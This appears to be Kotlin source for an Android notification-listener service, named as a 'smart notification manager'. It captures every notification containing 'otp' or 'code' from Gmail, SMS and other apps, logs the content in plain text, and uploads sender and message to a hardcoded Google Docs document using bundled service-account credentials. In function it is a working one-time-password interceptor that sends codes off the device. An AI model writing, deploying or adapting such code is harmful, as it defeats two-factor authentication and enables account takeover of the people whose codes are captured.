package com.example.smartnotificationmanager

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.google.api.client.http.HttpTransport
import com.google.api.client.http.javanet.NetHttpTransport
import com.google.api.client.json.JsonFactory
import com.google.api.client.json.gson.GsonFactory
import com.google.api.services.docs.v1.Docs
import com.google.api.services.docs.v1.DocsScopes
import com.google.api.services.docs.v1.model.BatchUpdateDocumentRequest
import com.google.api.services.docs.v1.model.InsertTextRequest
import com.google.api.services.docs.v1.model.Location
import com.google.api.services.docs.v1.model.Request
import com.google.auth.http.HttpCredentialsAdapter
import com.google.auth.oauth2.GoogleCredentials
import kotlinx.coroutines.DelicateCoroutinesApi
import java.io.InputStream

class MyNotificationListenerService : NotificationListenerService() {
    companion object {
        private const val TAG = "NotificationListener"  // Descriptive Tag

        // Sometimes notifications are triggered multiple times - for a heads-up notification, updates it with extended description and shortened form. To keep only one of them
        private var lastProcessedTime = 0L
        private var lastProcessedMessage = ""
        private var lastProcessedPackage = ""
        private const val DUPLICATE_THRESHOLD = 3000 // 3 sec
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val notification = sbn.notification
        val extras = notification.extras

        // Add more detailed logging
        Log.d(TAG, "===============================")
        Log.d(TAG, "Package: ${sbn.packageName}")
        Log.d(TAG, "Title: ${extras.getCharSequence(Notification.EXTRA_TITLE)}")
        Log.d(TAG, "Text: ${extras.getCharSequence(Notification.EXTRA_TEXT)}")
        Log.d(TAG, "Big Text: ${extras.getCharSequence(Notification.EXTRA_BIG_TEXT)}")
        Log.d(TAG, "===============================")

        // Combine both contents to check for OTP
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim() ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim() ?: ""

        // Use the most detailed content available
        val messageContent = if (bigText.isNotEmpty()) bigText else text

        Log.d(TAG, "Starting processing message")

        // Check for duplicate using existing logic
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastProcessedTime < DUPLICATE_THRESHOLD &&
            messageContent == lastProcessedMessage &&
            sbn.packageName == lastProcessedPackage
        ) {
            Log.d(TAG, "Skipping duplicate notification")
            return
        }

        // Update last processed info
        lastProcessedTime = currentTime
        lastProcessedMessage = messageContent
        lastProcessedPackage = sbn.packageName

        // Check if the message is not hidden and contains OTP
        if (messageContent.isNotEmpty() &&
            (messageContent.contains("otp", ignoreCase = true) || messageContent.contains("code", ignoreCase = true))
        ) {
            val formattedMessage = when (sbn.packageName) {
                "com.google.android.gm" -> {
                    // Gmail format - split subject and body
                    val subject = text
                    val body = if (subject.isEmpty()) {
                        messageContent
                    } else {
                        if (messageContent.startsWith(subject)) {
                            messageContent.substring(subject.length).trim()
                        } else {
                            messageContent
                        }
                    }
                    buildString {
                        append("Type: Gmail\n")
                        append("From: ").append(title).append("\n")
                        append("Subject: ").append(subject).append("\n")
                        append("Body: ").append(body).append("\n\n")
                    }
                }
                "com.google.android.apps.messaging", "com.android.mms" -> {
                    // Text message format
                    buildString {
                        append("Type: SMS\n")
                        append("From: ").append(title).append("\n")
                        append("Message: ").append(messageContent).append("\n\n")
                    }
                }
                else -> {
                    // Generic format for other apps
                    buildString {
                        append("Type: Other (${sbn.packageName})\n")
                        append("From: ").append(title).append("\n")
                        append("Message: ").append(messageContent).append("\n\n")
                    }
                }
            }

            Log.d(TAG, "OTP message detected, preparing to upload. Message: $formattedMessage")
            uploadToGoogleDocs(formattedMessage)
        } else {
            Log.d(TAG, "Message either hidden or no OTP found. Message: $messageContent")
        }
    }

    @OptIn(DelicateCoroutinesApi::class)
    private fun uploadToGoogleDocs(message: String) {
        Log.d("After PK", "Working")

        GlobalScope.launch(Dispatchers.IO) {
            // Use the applicationContext properly
            val inputStream: InputStream = applicationContext.assets.open("credentials.json") // Rename this file
            val jsonCred = inputStream.bufferedReader().use { it.readText() }

            Log.d(TAG, "Successfully read file")


            val googleCredentials = GoogleCredentials.fromStream(jsonCred.byteInputStream())
                .createScoped(listOf(DocsScopes.DOCUMENTS))

            val httpTransport: HttpTransport = NetHttpTransport()
            val jsonFactory: JsonFactory = GsonFactory()

            val requestInitializer = HttpCredentialsAdapter(googleCredentials)

            val service = Docs.Builder(httpTransport, jsonFactory, null)
                .setHttpRequestInitializer(requestInitializer)
                .setApplicationName("ProjectMessages")
                .build()

            val documentId = "1iDZrmRHG_VTqw0f---7mhJVr_a01p3nUK-YbG7pmGPk"
            val document = service.documents().get(documentId).execute()

            // Determine the insertion index
            val content = document.body?.content
            val lastIndex = content?.lastOrNull()?.endIndex ?: 1
            val insertionIndex = lastIndex - 1

            // Format the message with a timestamp
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val formattedMessage = "\nNew OTP: \n$message\tReceived at: $timestamp\n"

            // Create a request to insert the formatted message
            val requests = listOf(
                Request().setInsertText(
                    InsertTextRequest()
                        .setText(formattedMessage)
                        .setLocation(Location().setIndex(insertionIndex))
                )
            )

            // Try to update the Google Docs document
            try {
                service.documents()
                    .batchUpdate(documentId, BatchUpdateDocumentRequest().setRequests(requests))
                    .execute()
                Log.d("Afterpublishing", "Working")
            } catch (e: Exception) {
                Log.e("GoogleDocsError", "Failed to update document: ${e.message}")
            }
        }
    }

}